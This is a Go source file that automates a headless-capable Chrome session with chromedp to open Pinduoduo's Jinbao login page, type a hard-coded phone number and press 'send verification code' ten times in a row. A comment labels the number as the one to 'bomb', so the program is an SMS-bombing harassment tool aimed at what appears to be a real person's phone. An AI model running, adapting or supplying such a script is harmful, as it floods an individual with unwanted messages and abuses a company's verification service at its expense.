package main

import (
	"context"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

var (
	// 轰炸手机号
	phoneNum = `13925079032`

	// 等待组
	waitGroup sync.WaitGroup
)

func main() {
	// 执行
	for i := 0; i < 10; i++ {
		waitGroup.Add(1)
		ddjbSendCode()
	}

	waitGroup.Wait()
	fmt.Println("全部任务执行结束")
}

// 多多进宝
func ddjbSendCode() {
	var (
		// 登录首页
		loginUrl = `https://jinbao.pinduoduo.com/`

		// 登录按钮
		loginBtnPath = `#__next > div.jsx-3954532995.container > section > div > div.login-wrapper.right > div > span`

		// 手机号
		mobilePhonePath = `#mobile`

		// 发送验证码
		sendCodePath = `body > div.MDL_outerWrapper_14d8fyu.MDL_modal_14d8fyu.MDL_showCloseIcon_14d8fyu > div > div > div.MDL_body_14d8fyu > div > div.login-code-wrapper > div.code-line > button > span`

		// 计时器
		txt string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", false),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 不关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginUrl),
		chromedp.Click(loginBtnPath),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(3*time.Second),
		chromedp.OuterHTML(sendCodePath, &txt),
	)

	if err != nil {
		fmt.Println("多多进宝验证码发送失败", txt, err.Error())
		return
	}

	if !strings.Contains(txt, "获取验证码") {
		fmt.Println("多多进宝验证码发送成功", txt)
		return
	}

	fmt.Println("多多进宝验证码发送失败", txt, err.Error())
}
